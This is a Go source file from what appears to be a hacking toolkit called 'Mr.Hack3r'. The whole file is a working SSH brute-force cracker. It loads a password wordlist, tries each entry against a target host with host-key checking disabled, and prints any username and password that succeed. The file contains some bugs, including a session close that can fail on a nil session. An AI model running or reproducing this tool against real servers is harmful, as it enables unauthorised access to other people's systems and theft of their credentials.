package controllers

import (
	"bufio"
	"fmt"
	"os"
	"time"

	Colors "github.com/muhammadqazi/Mr.Hack3r/utils"
	"golang.org/x/crypto/ssh"
)

type HostInfo struct {
	host   string
	port   string
	user   string
	pass   string
	isWeak bool
}

func DictonaryBuilder(passDict string) (slicePass []string) {

	passDictFile, _ := os.Open(passDict)
	defer passDictFile.Close()
	scannerP := bufio.NewScanner(passDictFile)
	scannerP.Split(bufio.ScanLines)
	for scannerP.Scan() {
		slicePass = append(slicePass, scannerP.Text())
	}

	return slicePass
}

func SSHCracker(host, port, user, pass string) {

	fmt.Println(DictonaryBuilder(pass))

	HostInfo := HostInfo{}
	HostInfo.host = host
	HostInfo.port = port
	HostInfo.user = user
	HostInfo.isWeak = false

	fmt.Println(Colors.Blue(), "\n[+] Trying to crack ", Colors.Green(), HostInfo.host)

	for _, passwd := range DictonaryBuilder(pass) {

		HostInfo.pass = passwd

		if CrackHandler(HostInfo) {
			fmt.Println(Colors.Green(), "\n[+] Password found")
			fmt.Println(Colors.Blue(), "\n[+] User :", Colors.White(), HostInfo.user, Colors.Blue(), "\t[+] Password :", Colors.White(), HostInfo.pass)
		}
	}
}

func CrackHandler(HostInfo HostInfo) bool {
	host := HostInfo.host
	port := HostInfo.port
	user := HostInfo.user
	passwd := HostInfo.pass
	isOk := HostInfo.isWeak

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd),
		},
		Timeout:         10 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", host+":"+port, config)
	if err != nil {
		isOk = false
	} else {
		session, err := client.NewSession()

		if err != nil {
			isOk = false
		} else {
			isOk = true

		}
		defer session.Close()
	}

	return isOk
}
